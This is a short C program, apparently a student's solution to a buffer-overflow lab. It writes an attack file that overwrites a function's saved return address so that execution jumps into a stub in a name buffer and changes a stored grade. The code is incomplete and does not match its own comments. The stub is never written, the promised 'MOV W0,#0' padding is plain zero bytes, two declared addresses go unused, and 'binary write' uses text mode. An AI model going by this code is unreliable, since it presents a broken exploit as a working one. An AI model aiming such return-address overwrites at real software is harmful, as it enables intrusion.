
/* Ben Zhou and Owen Clarke*/

#include <stdio.h>
#include "miniassembler.h"
#include <string.h>

int main(void)
{
    FILE           *f;
    unsigned long   pc;
    unsigned int    instr;
    int             i;

    /* These constants come from the grader’s map: */
    const unsigned long NAME_ADDR   = 0x420058UL;  /* start of name[] in BSS */
    const unsigned long GRADE_ADDR  = 0x420044UL;  /* &grade global ('D') */
    const unsigned long PRINT_ADDR  = 0x40089cUL;  /* skip-B, print-grade code */

    /* 1) Open the attack file for binary write */
    f = fopen("dataA", "w");
    fprintf(f, "%s", "Ben Zhou and Owen Clarke");
    
    for (i = 0; i < 4; i++) { 
        fprintf(f, "%c", '\0'); 
    }





    /* e) Pad stub out to 48 bytes with harmless MOV W0,#0 (acts like NOP) */
    for (i = 0; i < 20; i++) {
        fprintf(f, "%c", '\0'); 

    }





    /* 3) Overwrite readString’s saved x30 with NAME_ADDR
        so that when readString does `ret`, it jumps into our stub. */
    fwrite(&NAME_ADDR, sizeof(NAME_ADDR), 1, f);

    fclose(f);
    return 0;
}